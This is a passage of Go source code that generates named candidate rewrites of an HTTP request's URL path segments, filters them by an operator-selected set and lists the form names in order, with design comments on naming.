	// Every position of this path, past whatever the fixed ladder carried, in
	// both placements.
	if req.URL != nil {
		positions := len(splitPath(req.URL.Path))
		for position := segmentPositionLimit; position < positions; position++ {
			for _, where := range []segmentPlacement{segmentBeforeSlash, segmentAfterSlash} {
				name := segmentNameAt(position, where)
				if allow != nil && !allow[name] {
					continue
				}
				if rewritten, ok := rewriteSegmentsAt(req, position, where); ok {
					out = append(out, Candidate{
						Form:   name,
						Method: rewritten.Method,
						URL:    rewritten.URL.String(),
					})
				}
			}
		}
	}
	return out
}

// segmentNameAt is the form's name for one position and placement.
//
// Past the fixed ladder there is no literal name to look up, so the string is
// built. That is the trade the ladder makes deliberately: the names inside it are
// literal and greppable, and the ones only this function produces are not — which
// is acceptable precisely because they only exist for paths longer than the ladder
// walks, and the ladder's own names stay reviewable.
func segmentNameAt(position int, where segmentPlacement) string {
	if where == segmentAfterSlash {
		return "path-segment-after-" + strconv.Itoa(position+1)
	}
	return "path-segment-" + strconv.Itoa(position+1)
}

// toSet is the operator's selection. A nil set means every form, which is
// different from an empty set, which means none.
func toSet(enabled []string) map[string]bool {
	if enabled == nil {
		return nil
	}
	set := make(map[string]bool, len(enabled))
	for _, name := range enabled {
		if trimmed := strings.TrimSpace(name); trimmed != "" {
			set[trimmed] = true
		}
	}
	return set
}

// Forms is every form's name, in ladder order.
//
// It exists so a caller can build a selection and so a test can assert on the
// order rather than on the internals.
func Forms() []string {
	ladder := Ladder()
	out := make([]string, 0, len(ladder))
	for _, form := range ladder {
		out = append(out, form.Name)
	}
	return out
}

// SegmentFormName is the name of the form that hides the segment at `position`.
func SegmentFormName(position int) string { return segmentFormName(position) }
